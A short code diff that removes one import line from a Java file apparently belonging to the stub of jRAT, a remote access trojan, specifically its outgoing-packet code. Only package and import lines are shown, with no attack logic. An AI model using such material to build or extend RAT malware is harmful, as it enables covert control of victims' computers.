@@ -1,7 +1,6 @@
 package pro.jrat.stub.packets.outgoing;
 
 import java.io.BufferedReader;
-import pro.jrat.stub.utils.*;
 import java.io.DataOutputStream;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
